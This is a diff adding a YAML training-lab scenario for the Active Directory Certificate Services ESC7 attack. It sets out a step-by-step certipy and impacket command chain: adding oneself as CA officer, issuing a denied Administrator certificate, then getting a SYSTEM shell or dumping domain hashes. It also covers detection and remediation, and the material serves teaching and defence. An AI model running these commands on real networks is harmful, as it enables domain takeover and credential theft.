@@ -1,0 +1,182 @@
+# Category: Active Directory - AD CS Attacks
+name: "AD CS ESC7 — Vulnerable Certificate Authority Access Control"
+id: "ad-adcs-esc7-001"
+category: "active_directory"
+subcategory: "ad_cs_attacks"
+difficulty: "expert"
+estimated_time: "120 minutes"
+
+description: |
+  Exploit excessive permissions on Active Directory Certificate Services (AD CS)
+  Certificate Authority (CA) servers (ESC7). Users with ManageCA or
+  ManageCertificates rights on a CA can approve pending certificate requests,
+  enable vulnerable templates like SubCA, modify CA configuration, and issue
+  certificates for any domain user, leading to full domain compromise.
+
+learning_objectives:
+  - Identify users with ManageCA and ManageCertificates rights on CAs
+  - Abuse ManageCA to enable vulnerable templates and modify CA settings
+  - Abuse ManageCertificates to approve pending certificate requests
+  - Chain ESC7 with other techniques for domain-wide compromise
+
+tools:
+  - certipy
+  - certify
+  - certutil
+  - rubeus
+  - impacket
+
+prerequisites:
+  - Valid low-privilege domain credentials
+  - ManageCA or ManageCertificates permission on a CA
+  - Network access to AD CS CA (TCP 443 or 135)
+  - Understanding of CA management and certificate issuance workflows
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Enumerate CA permissions for ESC7 vulnerabilities"
+    commands:
+      - "# Install Certipy"
+      - "pip3 install certipy-ad"
+      - "# Full enumeration with vulnerability detection"
+      - "certipy find -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -vulnerable -stdout"
+      - "# Look specifically for ESC7"
+      - "certipy find -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] | grep -E '(ESC7|ManageCA|ManageCertificates|Officer)'"
+      - "# Check CA permissions using Certify"
+      - "Certify.exe cas"
+      - "Certify.exe find /vulnerable"
+    expected_output: "CAs where current user has ManageCA or ManageCertificates rights"
+    detection: "LDAP queries for CA security descriptors; certipy/Certify execution"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Verify specific CA management permissions"
+    commands:
+      - "# Check if you have ManageCA rights"
+      - "certipy ca -ca '[ca_name]' -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip]"
+      - "# List CA officers and managers"
+      - "certutil -config '[ca_server]\\[ca_name]' -getreg 'Policy\Officers'"
+      - "# Check CA ACLs via LDAP"
+      - "ldapsearch -H ldap://[dc_ip] -x -D '[username]@[domain]' -w '[password]' -b 'CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=[dc1],DC=[dc2]' '(objectclass=pKIEnrollmentService)' cn"
+    expected_output: "Confirmation of ManageCA or ManageCertificates permissions on target CA"
+    detection: "Certutil execution querying CA officer list; LDAP queries for enrollment services"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Add yourself as CA officer (requires ManageCA)"
+    commands:
+      - "# Add current user as CA officer using ManageCA rights"
+      - "certipy ca -ca '[ca_name]' -add-officer '[username]' -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip]"
+      - "# Verify the officer was added"
+      - "certipy ca -ca '[ca_name]' -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip]"
+      - "# Enable SubCA template if not already enabled"
+      - "certipy ca -ca '[ca_name]' -enable-template 'SubCA' -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip]"
+    expected_output: "Successfully added as CA officer; SubCA template enabled"
+    detection: "CA officer addition (Event ID 4870); template enablement events"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Request SubCA certificate (will be denied, save private key)"
+    commands:
+      - "# Request SubCA certificate for Administrator"
+      - "certipy req -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -target [ca_server] -ca '[ca_name]' -template 'SubCA' -upn 'Administrator@[domain]'"
+      - "# The request will be denied but save the private key and note the Request ID"
+      - "# Expected output: 'Got error while trying to request certificate: CERTSRV_E_TEMPLATE_DENIED'"
+      - "# Note the Request ID (e.g., 785) and save the private key"
+      - "ls -la [request_id].key"
+    expected_output: "Denied certificate request with saved private key and known Request ID"
+    detection: "SubCA certificate request from non-admin user (Event ID 4886 with denial)"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Approve and issue the pending certificate request"
+    commands:
+      - "# Issue the denied certificate request using ManageCertificates rights"
+      - "certipy ca -ca '[ca_name]' -issue-request [request_id] -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip]"
+      - "# Retrieve the issued certificate"
+      - "certipy req -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -target [ca_server] -ca '[ca_name]' -retrieve [request_id]"
+      - "# Verify the certificate"
+      - "ls -la administrator.pfx"
+    expected_output: "administrator.pfx containing issued SubCA certificate for Administrator"
+    detection: "Certificate issuance for previously denied request (Event ID 4887)"
+
+  - id: "step6"
+    phase: "post_exploitation"
+    action: "Authenticate with the SubCA certificate and compromise domain"
+    commands:
+      - "# Authenticate with the certificate via PKINIT"
+      - "certipy auth -pfx administrator.pfx -dc-ip [dc_ip]"
+      - "# Use the resulting TGT"
+      - "export KRB5CCNAME=administrator.ccache"
+      - "impacket-psexec -k -no-pass [domain]/Administrator@[dc_ip]"
+      - "# Or use the NTLM hash for DCSync"
+      - "impacket-secretsdump -hashes ':[admin_ntlm_hash]' '[domain]/Administrator@[dc_ip]' -just-dc"
+    expected_output: "SYSTEM shell on domain controller or extracted domain hashes"
+    detection: "Kerberos PKINIT authentication with SubCA certificate (Event ID 4768)"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1649"
+    description: "Steal or Forge Authentication Certificates"
+  - standard: "NIST 800-53 Rev5"
+    control: "AC-3"
+    description: "Access Enforcement"
+  - standard: "CIS Controls v8"
+    control: "6.8"
+    description: "Define and maintain role-based access control"
+
+detection:
+  network_indicators:
+    - "CA officer additions from non-administrative accounts"
+    - "SubCA template enablement events"
+    - "Certificate issuance for previously denied requests"
+  log_indicators:
+    - "Event ID 4870: CA officer added"
+    - "Event ID 4886: SubCA certificate request denied"
+    - "Event ID 4887: Previously denied certificate issued"
+    - "Event ID 4768: Kerberos TGT via SubCA certificate"
+    - "Defender for Identity: Suspicious CA management activity"
+  endpoint_indicators:
+    - "Certipy ca -add-officer execution"
+    - "Certipy ca -enable-template SubCA"
+    - "Certipy ca -issue-request commands"
+
+remediation:
+  immediate:
+    - "Remove ManageCA and ManageCertificates rights from all non-administrative users"
+    - "Restrict CA officer roles to Domain Admins and Enterprise Admins only"
+    - "Disable SubCA template unless explicitly required"
+    - "Audit all certificates issued in the last 90 days for anomalies"
+  long_term:
+    - "Implement CA role separation (ManageCA vs ManageCertificates)"
+    - "Deploy regular CA permission audits using Certipy"
+    - "Monitor for CA officer additions and template enablement"
+    - "Use dedicated CA administration accounts with MFA"
+    - "Consider implementing AD CS in offline root CA configuration"
+
+variables:
+  domain: "corp.example.com"
+  dc1: "corp"
+  dc2: "example"
+  dc_ip: "192.168.1.10"
+  username: "jsmith"
+  password: "Password123"
+  ca_server: "ca01.corp.example.com"
+  ca_name: "corp-CA01-CA"
+  request_id: "785"
+  admin_ntlm_hash: "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+
+assessment_questions:
+  - "What permissions are required for ESC7 exploitation?"
+  - "Why is the SubCA template particularly dangerous in ESC7?"
+  - "How does the ESC7 attack chain work step by step?"
+  - "What is the difference between ManageCA and ManageCertificates rights?"
+
+references:
+  - url: "https://github.com/ly4k/Certipy"
+    title: "Certipy - AD CS Attack Tool"
+  - url: "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+    title: "Certified Pre-Owned - SpecterOps"
+  - url: "https://attack.mitre.org/techniques/T1649/"
+    title: "MITRE ATT&CK - Steal or Forge Authentication Certificates"
